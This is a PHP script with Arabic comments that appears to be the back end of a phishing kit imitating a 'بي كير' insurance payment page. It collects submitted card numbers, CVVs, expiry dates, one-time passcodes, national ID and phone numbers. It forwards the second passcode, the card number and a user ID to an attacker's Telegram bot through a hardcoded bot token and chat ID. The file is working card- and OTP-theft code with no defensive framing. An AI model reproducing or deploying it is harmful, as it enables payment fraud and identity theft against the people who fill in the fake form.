<?php
// إعدادات تيليجرام
$botToken = "8336961082:AAGqlFilNFcN-NVMrzWGeut7JhLd_yZqOkc";
$chatId = "8535558521";

// استقبال البيانات
$otp_code_first = isset($_POST['otp_code_first']) ? $_POST['otp_code_first'] : '';
$otp_code = isset($_POST['otp_code']) ? $_POST['otp_code'] : '';
$otp_code_second = isset($_POST['otp_code_second']) ? $_POST['otp_code_second'] : '';
$card_number = isset($_POST['card_number']) ? $_POST['card_number'] : (isset($_POST['cardnumber']) ? $_POST['cardnumber'] : '');
$cardholder_name = isset($_POST['cardholder_name']) ? $_POST['cardholder_name'] : (isset($_POST['name']) ? $_POST['name'] : '');
$expiry_date = isset($_POST['expiry_date']) ? $_POST['expiry_date'] : (isset($_POST['expirationdate']) ? $_POST['expirationdate'] : '');
$cvv = isset($_POST['cvv']) ? $_POST['cvv'] : (isset($_POST['securitycode']) ? $_POST['securitycode'] : '');

// بيانات التأمين
$company = isset($_POST['company']) ? $_POST['company'] : '';
$plan = isset($_POST['plan']) ? $_POST['plan'] : '';
$total = isset($_POST['total']) ? $_POST['total'] : '';

// بيانات العميل
$applicant_name = isset($_POST['applicant_name']) ? $_POST['applicant_name'] : '';
$identity_number = isset($_POST['identity_number']) ? $_POST['identity_number'] : '';
$phone_number = isset($_POST['phone_number']) ? $_POST['phone_number'] : '';
$user_id = isset($_POST['user_id']) ? $_POST['user_id'] : '';

// تنسيق رسالة تيليجرام
$message = "🔐 *رمز التحقق OTP - بي كير*\n\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";


if ($otp_code_second) {
    $message .= "🔢 *رمز OTP الثاني:* `{$otp_code_second}`\n";
}
$message .= "\n";

$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";

$message .= "🔢 *card number:* `{$card_number}`\n";


$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";


if ($user_id) {
    $message .= "🔑 *User ID:* `{$user_id}`\n\n";
}

$message .= "⏰ *التاريخ والوقت:* " . date('Y-m-d H:i:s') . "\n";

// إرسال الرسالة إلى تيليجرام
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$data = array(
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
);

$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    )
);

$context  = stream_context_create($options);
$result = @file_get_contents($url, false, $context);

// إرجاع نتيجة نجاح
if ($result === FALSE) {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Failed to send message']);
} else {
    http_response_code(200);
    echo json_encode(['status' => 'success', 'message' => 'OTP sent to Telegram']);
}
?>